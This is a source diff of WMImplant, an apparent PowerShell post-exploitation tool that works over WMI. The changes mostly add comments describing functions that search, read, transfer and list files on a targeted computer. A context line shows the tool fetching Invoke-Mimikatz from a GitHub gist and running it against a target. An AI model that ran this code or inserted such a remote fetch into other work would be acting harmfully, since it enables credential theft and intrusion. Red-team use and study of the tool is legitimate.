@@ -2895,7 +2895,8 @@ function Invoke-WMImplant
                         {
                             Invoke-RemoteScriptWithOutput -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $Computer
                         }
-                }   }
+                    }
+                }
 
                 "ps"
                 {
@@ -3307,6 +3308,7 @@ function Show-WMImplantMainMenu
 
 function Use-MenuSelection
 {
+    # This function is where the user provides the command they wish to execute
     param
     (
         [Parameter(Mandatory = $False)]
@@ -3755,6 +3757,8 @@ function Use-MenuSelection
 
 function Find-FileWMImplant
 {
+    # This function enables a user to search for a file name or extension on the
+    # targeted computer
     param
     (
         [Parameter(Mandatory = $False)]
@@ -3913,7 +3917,7 @@ function Find-FileWMImplant
 
 function Get-FileContentsWMImplant
 {
-
+    # This function reads and displays the contents of a user-specified file on the targeted machine to the console
     param
     (
         [Parameter(Mandatory = $False)]
@@ -3982,6 +3986,7 @@ function Get-FileContentsWMImplant
 
 function Invoke-FileTransferWMImplant
 {
+    # This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine
     param
     (
         [Parameter(Mandatory = $False)]
@@ -4167,6 +4172,7 @@ function Invoke-FileTransferWMImplant
 
 function Invoke-LSWMImplant
 {
+    # This function retrieves a diretory listing of all files from a user-specified directory on the targeted system
     param
     (
         #Parameter assignment
